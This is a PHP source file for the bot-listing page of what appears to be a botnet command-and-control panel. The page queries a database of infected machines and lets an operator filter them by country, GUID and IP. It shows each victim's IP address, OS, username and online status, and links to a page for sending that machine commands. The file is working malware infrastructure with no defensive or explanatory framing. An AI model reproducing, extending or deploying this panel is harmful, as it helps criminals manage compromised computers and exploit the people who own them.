<?php
require_once('inc/common.php');
$db = db();
ui_start('Bots');
ui_content_start();
?>
<div class="box">
  <div>Search</div>
  <form method="GET">
    <table>
      <tr><td>Country:</td>
          <td><input type="text" class="input" name="countries"></td></tr>
      <tr><td>GUID:</td>
          <td><input type="text" class="input" name="guids"></td></tr>
      <tr><td>IPv4:</td>
          <td><input type="text" class="input" name="ips"></td></tr>
      <tr>
        <td>
        </td>
        <td style="text-align: right; color: #333;">
          <input style="float: left;" type="submit" class="btn" value="Submit">
          Order By
          <select class="input" name="order" style="width: 100px;">
            <option value="0">Last Seen</option>
            <option value="1">First Seen</option>
          </select>
          <select class="input " name="dir" style="width: 100px;">
            <option value="0">Descending</option>
            <option value="1">Ascending</option>
          </select>
        </td>
      </tr>
    </table>
  </form>
</div>
<?php
if(isset($_GET['countries']))
{
   $sqlWhere = '';
   if($_GET['countries'] != '')
   {
      $countries = explode(' ', $_GET['countries']);
      $sqlWhere .= ' AND country IN ('.gen_qmarks($countries).')';
   }
   if($_GET['guids'] != '')
   {
      $guid = explode(' ', $_GET['guids']);
      $sqlWhere .= ' AND guid IN ('.gen_qmarks($guid).')';
   }
   if($_GET['ips'] != '')
   {
      $ips = explode(' ', $_GET['ips']);
      for($i = 0; $i < count($ips); ++$i)
         $ips[$i] = ip2long($ips[$i]);
      $sqlWhere .= ' AND ip IN ('.gen_qmarks($ips).')';
   }
   
   function bind_values()
   {
      global $query, $countries, $guid, $ips, $i;
      if($_GET['countries'] != '')
      {
         foreach($countries as $country)
            $query->bindValue(++$i, $country, PDO::PARAM_STR); 
      }
      if($_GET['guids'] != '')
      {
         foreach($guid as $uhid)
            $query->bindValue(++$i, $uhid, PDO::PARAM_STR);
      }
      if($_GET['ips'] != '')
      {
         foreach($ips as $ip)
            $query->bindValue(++$i, $ip, PDO::PARAM_INT);
      }
   }
   
   $query = $db->prepare('SELECT COUNT(*) FROM bots WHERE 1 = 1'.$sqlWhere);
   $i = 0;
   bind_values();
   $query->execute();
   $total = $query->fetchColumn();
   if($total == 0)
      echo('<div class="error margin-top">No bots found</div>');
   else
   {
      get_pag_vars($total, $pages, $page, $offset);
      $query = $db->prepare('SELECT * FROM bots WHERE 1 = 1'.$sqlWhere.' ORDER BY '.($_GET['order'] == 1 ? 'first_seen' : 'last_seen').' 
                             '.($_GET['dir'] == 1 ? 'ASC' : 'DESC').' LIMIT ? OFFSET ?');
      $i = 0;
      bind_values();
      $query->bindValue(++$i, $CONST_PAGE_LIMIT, PDO::PARAM_INT);
      $query->bindValue(++$i, $offset, PDO::PARAM_INT);
      $query->execute();
?>
   <div class="box margin-top">
     <div>Bots</div>
     <table class="table">
       <tr><th>GUID</th><th>IPv4</th><th>Country</th><th>OS</th><th>Username</th><th>Last Seen</th><th>First Seen</th><th>Options</th></tr>
<?php
      $rows  = $query->fetchAll();
      $geoip = new GeoIP();
      foreach($rows as $row)
      {
?>
<tr>
  <td><?php echo(htmlspecialchars($row['guid'])); ?></td>
  <td><?php echo(long2ip($row['ip'])); ?></td>
  <td><?php echo($row['country'].' <em>('.$geoip->GEOIP_COUNTRY_NAMES[$geoip->GEOIP_COUNTRY_CODE_TO_NUMBER[$row['country']]].')</em>'); ?></td>
  <td><?php printf("%s (%s)", get_os($row['os']), $row['arch'] ? 'x64' : 'x86'); ?></td>
  <td><?php echo(htmlspecialchars($row['username'])); ?></td>
  <td>
    <?php echo('<label title="'.format_time($row['last_seen']).'">'.time_since($row['last_seen']).'</label>'); ?>
    <em>
      <?php echo((is_online($row['last_seen']) ? '(Online)' : '(Offline)')); ?>
    </em>
  </td>
  <td>
    <?php echo('<label title="'.format_time($row['first_seen']).'">'.time_since($row['first_seen']).'</label>'); ?>
  </td>
  <td>
     <a href="commands.php?guid=<?php echo(htmlspecialchars($row['guid'])); ?>" target="_blank" class="btn" style="width: 25px;">Command</a>
  </td>
</tr>
<?php
      }
      echo('</table>');
      echo_pag_form($page, $pages);
      echo('</div>');
  }
}
ui_content_end();
ui_end();
?>